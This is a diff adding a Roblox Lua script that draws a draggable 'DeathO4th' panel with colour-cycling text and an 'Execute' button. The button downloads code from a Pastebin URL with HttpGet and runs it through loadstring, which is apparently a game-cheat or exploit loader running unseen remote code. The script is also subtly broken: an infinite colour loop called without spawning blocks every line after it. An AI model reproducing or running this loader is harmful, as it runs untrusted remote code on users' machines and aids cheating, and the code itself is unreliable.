@@ -1,0 +1,123 @@
+-- Create a ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SmallBlackGui"
+screenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
+
+-- Create a Frame for the border
+local border = Instance.new("Frame")
+border.Size = UDim2.new(0, 210, 0, 110) -- Slightly larger than the main frame
+border.Position = UDim2.new(0.5, -105, 0.5, -55) -- Centered on the screen
+border.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Red color for visibility
+border.BackgroundTransparency = 0.5 -- Make it semi-transparent to see the color change
+border.Parent = screenGui
+
+-- Create a Frame for the main GUI
+local frame = Instance.new("Frame")
+frame.Size = UDim2.new(0, 200, 0, 100) -- Size of the main frame
+frame.Position = UDim2.new(0.5, -100, 0.5, -50) -- Centered on the screen
+frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black color
+frame.BorderSizePixel = 0 -- Remove border
+frame.Parent = screenGui
+
+-- Create a Title Label
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1, 0, 0, 30) -- Full width, 30 pixels tall
+titleLabel.Position = UDim2.new(0, 0, 0, 0) -- Position at the top of the frame
+titleLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- Black background
+titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255) -- White text
+titleLabel.TextScaled = true -- Scale text to fit the label
+titleLabel.Text = "DeathO4th" -- Title text
+titleLabel.Parent = frame
+
+-- Function to change the title color dynamically
+local function changeTitleColor()
+    while true do
+        for i = 0, 255, 5 do
+            titleLabel.TextColor3 = Color3.fromRGB(i, 0, 255 - i) -- Gradual color change
+            wait(0.05) -- Wait to create a smooth transition
+        end
+        for i = 255, 0, -5 do
+            titleLabel.TextColor3 = Color3.fromRGB(i, 0, 255 - i) -- Gradual color change
+            wait(0.05) -- Wait to create a smooth transition
+        end
+    end
+end
+
+-- Start the title color changing function
+changeTitleColor()
+
+-- Create a Close Button
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 50, 0, 25) -- Size of the button
+closeButton.Position = UDim2.new(1, -60, 0, 5) -- Position on the frame
+closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0) -- Red color for visibility
+closeButton.Text = "X" -- Close button text
+closeButton.Parent = frame
+
+-- Close button functionality
+closeButton.MouseButton1Click:Connect(function()
+    screenGui:Destroy() -- Destroy the GUI when clicked
+end)
+
+-- Create an Execute Button
+local executeButton = Instance.new("TextButton")
+executeButton.Size = UDim2.new(0, 100, 0, 25) -- Size of the execute button
+executeButton.Position = UDim2.new(0.5, -50, 0.5, 30) -- Positioned below the title
+executeButton.BackgroundColor3 = Color3.fromRGB(0, 255, 0) -- Green color for visibility
+executeButton.Text = "Execute" -- Execute button text
+executeButton.Parent = frame
+
+-- Execute button functionality
+executeButton.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/WuFL67wN"))() -- Execute the code
+end)
+
+-- Function to change border color dynamically
+local function changeBorderColor()
+    while true do
+        for i = 0, 255, 5 do
+            border.BackgroundColor3 = Color3.fromRGB(i, 0, 255 - i) -- Gradual color change
+            wait(0.05) -- Wait to create a smooth transition
+        end
+        for i = 255, 0, -5 do
+            border.BackgroundColor3 = Color3.fromRGB(i, 0, 255 - i) -- Gradual color change
+            wait(0.05) -- Wait to create a smooth transition
+        end
+    end
+end
+
+-- Start the border color changing function
+changeBorderColor()
+
+-- Draggable Functionality
+local dragging
+local dragInput
+local dragStart
+local startPos
+
+local function updateInput(input)
+    local delta = input.Position - dragStart
+    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        if dragging then
+            updateInput(input)
+        end
+    end
+end)
